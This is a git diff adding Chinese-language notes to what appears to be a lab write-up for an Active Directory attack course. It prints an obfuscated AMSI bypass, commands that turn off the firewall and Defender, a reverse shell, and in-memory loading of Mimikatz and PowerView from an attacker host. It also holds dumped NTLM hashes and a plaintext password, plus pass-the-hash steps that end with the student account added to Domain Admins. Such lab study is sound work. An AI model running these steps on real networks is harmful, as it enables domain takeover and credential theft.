@@ -2,9 +2,15 @@
 下载工具：
 https://mremoteng.org/download
 
+
 # 绕过AMSI
 ```
 S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+# 绕过powershell执行策略
+```
+powershell -ep bypass
 ```
 
 # Learning Objective - 1
@@ -203,7 +209,7 @@ dcorp-dc.dollarcorp.moneycorp.local
 dcorp-mgmt.dollarcorp.moneycorp.local
 dcorp-ci.dollarcorp.moneycorp.local
 dcorp-mssql.dollarcorp.moneycorp.local
-dcorp-adminsrv.dollarcorp.moneycorp.loc
+dcorp-adminsrv.dollarcorp.moneycorp.local
 dcorp-appsrv.dollarcorp.moneycorp.local
 dcorp-sql1.dollarcorp.moneycorp.local
 dcorp-stdadm.dollarcorp.moneycorp.local
@@ -815,15 +821,27 @@ Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:
 
 # Learning Objective - 5（3）
 
+在未登陆的情况下，可以通过下面页面查看有什么账号
+```http://172.16.3.11:8080/asynchpeople/```
+
+可以看到有builduser，jenkinsadmin，	manager三个账号
+
+手动测试发现
+
 Jenkins 登录账号信息是：
 ```builduser:builduser```
 
-文档说是手动枚举出来，我觉得这也太扯了。。
+
 
 问题：Jenkins user used to access Jenkins web console
 答案：builduser
 
 # Learning Objective - 5（4）
+
+
+Jenkins特权提升，可以通过两种方法
+1. 第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
+2. 第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权
 
 powercat监听
 ```
@@ -852,3 +870,942 @@ python -m SimpleHTTPServer 80
 答案：ciadmin
 
 
+### 关闭防火墙和windows defend
+
+后来问了助教，原来是本地防火墙没有关闭，导致反弹不了shell
+1. 关闭防火墙：
+```NetSh Advfirewall set allprofiles state off```
+
+上面命令需要管理员权限，因为我们已经在本地提权到了管理员组，只需要以run as administrator开启一个cmd命令行，然后输入当前域账号登录信息，即可以管理员身份开启cmd，执行上面命令
+
+查看防火墙状态：
+```
+PS C:\Windows\system32> netsh advfirewall show currentprofile
+
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Ok.
+```
+
+2. 关闭windows defend
+
+获取windefand状态
+```
+PS C:\ad> Get-Service WinDefend
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  WinDefend          Windows Defender Service
+```
+
+以管理员身份运行下面powershll命令：
+```reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywar" /d 1 /t REG_DWORD```
+
+再在教学面板reboot student VM (lab下不可以在VM里直接重启)
+
+重新登录以后，再次查看windefand状态
+```
+PS C:\Windows\system32> Get-Service WinDefend
+
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  WinDefend          Windows Defender ServicePS C:\Windows\system32> Get-Service WinDefend
+
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  WinDefend          Windows Defender Service
+```
+
+已成功关闭windows defend
+
+
+然后我把nc.exe传到靶机，用nc成功接收到反弹shell。我怀疑是powercat本身的问题。不过传nc之前一定要关闭WinDefend，不然有可能会被当成病毒被WinDefend杀掉。
+```
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.3.11] 50406
+Windows PowerShell running as user ciadmin on DCORP-CI
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project1>whoami
+dcorp\ciadmin
+PS C:\Program Files (x86)\Jenkins\workspace\project1> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::e599:a231:d264:7200%2
+   IPv4 Address. . . . . . . . . . . : 172.16.3.11
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.3.254
+
+Tunnel adapter isatap.{5BF9E7FE-BDCB-487C-B818-7332CA8AFB16}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+```
+
+
+## 再再再补充
+跟助教继续沟通。不是powercat的问题，其实是已经收到了反弹的shell，只不过需要按多几下Enter键才能显示出反弹shell的内容，我尼玛。。。
+
+
+# Learning Objective - 6
+
+Task
+> • Setup BloodHound and identify a machine where studentx has local administrative access.
+
+
+
+1. 收集信息
+工具：BloodHound-master
+
+引入： 
+```
+. .\SharpHound.ps1
+```
+
+收集全部域信息
+```
+Invoke-BloodHound -CollectionMethod All -verbose
+```
+
+
+```
+PS C:\ad\BloodHound-master\Ingestors> ls
+
+
+    Directory: C:\ad\BloodHound-master\Ingestors
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/12/2022   7:44 PM                DebugBuilds
+-a----        2/12/2022   7:49 PM          14519 20220212194952_BloodHound.zip
+-a----        2/12/2022   7:49 PM          29184 MjdjZDRjMmMtZWVhZC00YmE4LThkYmItZWQ4NWVmMjllN2Mx.bin
+------        7/22/2020  11:12 AM         833536 SharpHound.exe
+------        7/22/2020  11:12 AM         973425 SharpHound.ps1
+
+
+```
+
+
+2. 开启neo4j
+工具：neo4j-community-4.1.1
+
+去到```C:\AD\neo4j-community-4.1.1\bin```（需要管理员权限，上面通过service abuse已经把当前账号加入到本地管理员组，因此输入当前账号应该可以成功启动，需要注意账号必须是域账号，比如：dcorp\student366）执行
+```
+neo4j.bat install-service
+```
+再执行：
+```
+neo4j.bat start
+```
+
+3. 开启BloodHound
+工具： BloodHound-win32-x64
+
+双击BloodHound.exe
+
+第一次登录的账号密码，neo4j:neo4j （会要求更改密码）
+
+去到:http://localhost:7474 修改密码
+
+用修改完成的密码登录bloodhound
+
+
+展开bloodhound，可以发现所有student用户对```dcorp-adminsrv.dollarcorp.moneycorp.local```这台计算机拥有admin accesss权限
+
+
+问题：Collectionmethod in BloodHound that covers all the collection methods
+答案：All
+
+# Learning Objective - 7
+
+Task
+> ● Domain user on one of the machines has access to a server where a domain admin is logged in.
+> Identify:
+> − The domain user
+> − The server where the domain admin is logged in.
+> ● Escalate privileges to Domain Admin
+> − Using the method above.
+> −  Using derivative local admin 
+
+
+
+现在已经进到Jenkins所在的靶机，当前账号是ciadmin，是这台靶机内的adminstrators组成员
+
+输入命令再次绕过AMSI和poswershell执行策略
+
+## userhunter
+下面命令可以把远程脚本导入到本机内存，无须下载执行脚本到本地。
+
+```iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)```
+
+运行invoke-userhunter，查找
+```
+PS C:\users\ciadmin> iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
+PS C:\users\ciadmin> invoke-userhunter
+
+UserDomain      : dollarcorp.moneycorp.local
+UserName        : Administrator
+ComputerName    : dcorp-appsrv.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.217
+SessionFrom     : 172.16.2.1
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : dcorp
+UserName        : svcadmin
+ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.44
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
+```
+
+可以看到svcadmin登录过dcorp-mgmt，计算机名字是```dcorp-mgmt.dollarcorp.moneycorp.local```
+
+查看当前账号（ciadmin）对哪些机器有本地管理员权限
+```
+PS C:\users\ciadmin> invoke-userhunter -checkAccess
+UserDomain      : dcorp
+UserName        : svcadmin
+ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
+IPAddress       : 172.16.4.44
+SessionFrom     :
+SessionFromName :
+LocalAdmin      : True
+```
+
+看到是有LocalAdmin权限的，可以用以下命令在对方机器执行验证
+```
+PS C:\users\ciadmin> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp\ciadmin
+dcorp-mgmt
+```
+## 横向移动
+
+引入Invoke-Mimikatz.ps1，并且在内存中执行
+
+```
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+
+从上面我们已经知道当前账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
+```$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local```
+
+指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
+```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess```
+
+指定目标靶机的session，在目标靶机执行Mimikatz
+```Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess```
+
+
+执行操作如下，导出所有ntml 哈希
+```
+PS C:\Program Files (x86)\Jenkins\workspace\project1> powershell -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project1>
+PS C:\Program Files (x86)\Jenkins\workspace\project1> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
+PS C:\Program Files (x86)\Jenkins\workspace\project1> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+PS C:\Program Files (x86)\Jenkins\workspace\project1> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 62734 (00000000:0000f50e)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:26 AM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+        msv :
+         [00000003] Primary
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
+         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
+        tspkg :
+        wdigest :
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : DCORP-MGMT$
+         * Domain   : dollarcorp.moneycorp.local
+         * Password : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 4
+ 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c
+ cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e
+ f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4
+ 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DCORP-MGMT$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:23 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
+         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
+        tspkg :
+        wdigest :
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-mgmt$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 21649 (00000000:00005491)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:23 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
+         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 207093 (00000000:000328f5)
+Session           : RemoteInteractive from 2
+User Name         : mgmtadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 11/26/2020 8:44:31 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1121
+        msv :
+         [00000003] Primary
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
+         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
+         * DPAPI    : b826a190021809d711368730cfc6e41d
+        tspkg :
+        wdigest :
+         * Username : mgmtadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : mgmtadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64905 (00000000:0000fd89)
+Session           : Service from 0
+User Name         : svcadmin
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 11/26/2020 8:41:27 AM
+SID               : S-1-5-21-1874506631-3219952063-538504511-1122
+        msv :
+         [00000003] Primary
+         * Username : svcadmin
+         * Domain   : dcorp
+         * NTLM     : b38ff50264b74508085d82c69794a4d8
+         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
+         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
+        tspkg :
+        wdigest :
+         * Username : svcadmin
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : svcadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : *ThisisBlasphemyThisisMadness!!
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:24 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCORP-MGMT$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 11/26/2020 8:41:23 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DCORP-MGMT$
+         * Domain   : dcorp
+         * Password : (null)
+        kerberos :
+         * Username : dcorp-mgmt$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+```
+
+整理出所有导出的用户哈希
+```
+SQLTELEMETRY：639c1adde3e0d1ba0d733c7d0d8f23ec
+DCORP-MGMT$：639c1adde3e0d1ba0d733c7d0d8f23ec
+mgmtadmin：95e2cd7ff77379e34c6e46265e75d754
+svcadmin：b38ff50264b74508085d82c69794a4d8
+```
+
+因为svcadmin是Domain Admins组成员，我们已经成功取得这个域的特权账号。
+
+
+
+## 提权到Domain Admins方法（一）Over the hash
+
+使用下面命令可以利用高权限哈希生成一个令牌shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+```
+
+
+回到我们的学生靶机，现在我们有了svcadmin的哈希信息，可以回到学生靶机用Mimikatz运行一个有Domain Admins权限的shell。需要注意，新打开的shell，还是在学生机里面，我们并没有进入域控，但其实是有Domain Admins权限的
+```
+PS C:\Windows\system32> powershell -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> cd c:/ad
+PS C:\ad> . .\Invoke-Mimikatz.ps1
+PS C:\ad> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74
+508085d82c69794a4d8 /run:powershell.exe"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c6979
+4a4d8 /run:powershell.exe
+user    : svcadmin
+domain  : dollarcorp.moneycorp.local
+program : powershell.exe
+impers. : no
+NTLM    : b38ff50264b74508085d82c69794a4d8
+  |  PID  3104
+  |  TID  4864
+  |  LSA Process is now R/W
+  |  LUID 0 ; 41299079 (00000000:02762c87)
+  \_ msv1_0   - data copy @ 0000028946288B00 : OK !
+  \_ kerberos - data copy @ 0000028946AF9928
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000028946B47AF8 (32) -> null
+
+PS C:\ad>
+```
+
+
+新开的shell
+```
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+dcorp\student366
+```
+
+
+在新开的shell里把当前账号添加进Domain Admins组中
+```
+PS C:\Windows\system32> net group "Domain Admins" student366 /ADD /DOMAIN
+The request will be processed at a domain controller for domain dollarcorp.moneycorp.local.
+
+The command completed successfully.
+```
+
+上面命令执行完成以后，另外一个shell查找所有域管理员,本账号（student366）已被成功添加进Domain Admins
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad>  Get-NetGroupMember -GroupName "Domain Admins" -Recurse
+
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : Hulk
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-68601
+IsGroup      : False
+MemberDN     : CN=Hulk,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : student369
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45147
+IsGroup      : False
+MemberDN     : CN=student369,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : student366
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45144
+IsGroup      : False
+MemberDN     : CN=student366,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : svcadmin
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
+IsGroup      : False
+MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : Administrator
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
+IsGroup      : False
+MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+```
+
+## 提权到Domain Admins方法（二）
+
+在学生机器用powerview查看当前账号拥有admin权限进入的计算机
+```
+PS C:\ad> Find-LocalAdminAccess
+dcorp-std366.dollarcorp.moneycorp.local
+dcorp-adminsrv.dollarcorp.moneycorp.local
+```
+
+可以看见，除了本机还有一台dcorp-adminsrv
+
+还可以用Find-PSRemotingLocalAdminAccess查看，结果一致
+```
+PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
+PS C:\ad> Find-PSRemotingLocalAdminAccess
+dcorp-adminsrv
+dcorp-std366
+```
+
+下面两个命令都可以横向移动到dcorp-adminsrv
+```Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local```
+或者
+```Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local```
+
+可以看到当前账号dcorp\student366属于本地管理员（BUILTIN\Administrators）
+```
+PS C:\ad> Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ ==============================================
+dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ===============================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+```
+
+
+可以绕过powershell执行策略，但是没有办法绕过AMSI,产生了报错
+```
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> powershell -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\student366\Documents>
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`B
+L(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD
+"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
+Get-varIABL : The term 'Get-varIABL' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included,
+verify that the path is correct and try again.
+At line:1 char:98
++ ... 'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+' ...
++                                                     ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-varIABL:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+```
+
+不能在当前靶机引入任何powershell脚本，（既不能下载到本地，也不能在内存中引入）因为在dcorp-adminsrv这台机器有 Applocker策略
+
+> 什么是Applocker策略？
+> AppLocker 可推进软件限制策略的应用控制特性和功能。 AppLocker 包含新的功能和扩展，允许你创建规则以允许或拒绝应用基于文件的唯一标识运行，并指定哪些用户或组可以运行这些应用
+> 使用 AppLocker，你可以：
+> 控制以下类型的应用：可执行文件（.exe 和 .com) 、 scripts (.js、.ps1、.vbs、.cmd 和 .bat) 、Windows Installer 文件 (.mst、.msi 和 .msp) 以及 DLL 文件（.dll 和 .ocx) ），以及打包的应用和封装应用安装程序 (appx) 。
+> 根据从数字签名派生的文件属性（包括发布者、产品名称、文件名和文件版本）定义规则。 例如，可以创建基于通过更新持久化发布者属性的规则，也可以为文件的特定版本创建规则。
+> 向安全组或单个用户分配规则。
+> 创建规则异常。 例如，您可以创建一个规则，允许除注册表编辑器 (Regedit.exe Windows之外的所有进程运行) 。
+> 使用仅审核模式部署策略，并在强制执行它之前了解其影响。
+> 导入和导出规则。 导入和导出会影响整个策略。 例如，如果导出策略，将导出所有规则集合的所有规则，包括规则集合的强制设置。 如果导入策略，将覆盖现有策略的所有条件。
+> 通过使用 cmdlet 简化 AppLocker 规则的创建Windows PowerShell管理。
+
+下面命令枚举所有Applocker策略
+
+```
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+
+PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
+Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
+Description         :
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
+Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
+Description         :
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
+Name                : (Default Rule) All scripts located in the Program Files folder
+Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
+Name                : (Default Rule) All scripts located in the Windows folder
+Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
